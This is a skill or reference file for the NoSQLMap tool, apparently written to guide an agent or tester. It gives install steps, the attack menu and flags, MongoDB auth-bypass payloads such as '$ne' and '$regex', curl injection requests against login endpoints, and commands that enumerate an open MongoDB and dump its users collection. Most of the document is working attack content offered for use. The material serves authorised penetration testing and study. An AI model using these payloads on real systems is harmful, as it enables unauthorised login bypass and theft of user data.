---
name: nosqlmap
description: "Auth/lab ref: automated NoSQL injection detection and exploitation tool targeting MongoDB, CouchDB, and other NoSQL databases."
license: GPL-2.0
compatibility: "Linux / macOS / Windows; Python 3."
metadata:
  author: AeonDave
  version: "1.0"
---

# NoSQLMap

Automated NoSQL injection and exploitation — MongoDB, CouchDB, server-side JS injection.

## Quick Start

```bash
git clone https://github.com/codingo/NoSQLMap
cd NoSQLMap && python3 setup.py install

# Launch interactive menu
python3 nosqlmap.py

# Or direct web app attack
python3 nosqlmap.py --attack 3
```

## Interactive Menu

```
Main Menu:
  1 - Set options (target, port, URI)
  2 - NoSQL DB Access Attacks       # Direct DB connection exploits
  3 - NoSQL Web App Attacks         # HTTP injection via web app
  4 - Scan for Anonymous MongoDB Access
  x - Exit
```

## Web App Attack Setup (Option 3)

```
Set options first:
  1 - Set target host: target.com
  2 - Set web app port: 443
  3 - Set URI: /api/login
  4 - Set HTTP method: POST
  5 - Set POST data: {"username":"admin","password":"test"}
  6 - Set parameter to attack: password

Then run:
  3 - Assess NoSQL injections       # Test all injection types
  4 - MongoDB injection             # Focused MongoDB test
```

## Injection Techniques

| Technique | Payload | Effect |
|-----------|---------|--------|
| **Auth Bypass** | `{"$ne": "invalid"}` | Matches anything != value |
| **Auth Bypass** | `{"$gt": ""}` | Matches anything > empty |
| **Regex** | `{"$regex": ".*"}` | Matches all via regex |
| **Where** | `{"$where": "1==1"}` | Server-side JS eval |
| **Array** | `["admin", "user"]` | Array injection |

### Raw Manual Payloads

```bash
# JSON body — auth bypass
curl -s -X POST https://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$ne": "wrongpass"}}'

# URL parameter — array injection
curl "https://target.com/api?user[$ne]=invalid"

# PHP-style param array
curl "https://target.com/api?user[$regex]=.*&password[$ne]=invalid"
```

## Direct MongoDB Access Attacks (Option 2)

Requires network access to MongoDB port (27017):

```bash
# Anonymous access scan (no creds required)
python3 nosqlmap.py --attack 4 --rhost 10.0.0.1

# Enumerate databases on open MongoDB
mongo --host target.com --port 27017
> show dbs
> use admin
> show collections
> db.users.find()
```

## NoSQLMap Flags (Direct Mode)

| Flag | Purpose |
|------|---------|
| `--attack <n>` | Attack mode: 2=DB access, 3=web app, 4=anon scan |
| `--rhost <host>` | Target host |
| `--rport <port>` | Target port (default: 27017 for MongoDB) |
| `--webPort <port>` | Web app port (default: 80) |
| `--uri <path>` | Web URI path |
| `--httpMethod <m>` | GET or POST |
| `--postData <data>` | POST body |
| `--injectedParam <p>` | Parameter to inject |
| `--verbose` | Verbose output |

## MongoDB Auth Bypass Cheat Sheet

```javascript
// Login forms — try these as password values:
{"$ne": null}
{"$ne": "x"}
{"$gt": ""}
{"$gte": ""}
{"$regex": ".*"}
{"$where": "1==1"}

// Username + password bypass combo:
// username: admin, password: {"$ne": "x"}
// username: {"$regex": "admin.*"}, password: {"$ne": "x"}
```

## References

- [NoSQLMap GitHub](https://github.com/codingo/NoSQLMap)
- NoSQL injection payloads: `references/nosql-payloads.md`
- [HackTricks NoSQL Injection](https://book.hacktricks.xyz/pentesting-web/nosql-injection)
